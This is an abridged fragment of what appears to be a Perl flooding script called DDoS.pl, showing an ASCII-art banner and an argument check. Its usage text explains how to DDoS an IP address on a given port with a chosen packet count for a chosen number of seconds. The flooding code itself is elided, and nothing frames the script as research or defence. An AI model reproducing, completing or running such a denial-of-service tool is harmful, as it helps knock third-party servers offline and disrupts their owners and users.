...
| $$  | $$  /$$/    | $$  | $$| $$\  $ | $$| $$  | $$| $$\  $$   | $$  
|  $$$$$$/ /$$$$$$$$|  $$$$$$/| $$ \/  | $$| $$  | $$| $$ \  $$ /$$$$$$
 \______/ |________/ \______/ |__/     |__/|__/  |__/|__/  \__/|______/
...
if ($#ARGV != 3) {
  ...
  print "-Ex) perl DDoS.pl 1.1.1.1 80 45000 300\n";
  print "-Therefore DDoSing the IP '1.1.1.1' for '300' seconds on port '80' using '45000' packets\n\n";
  exit(1);
}
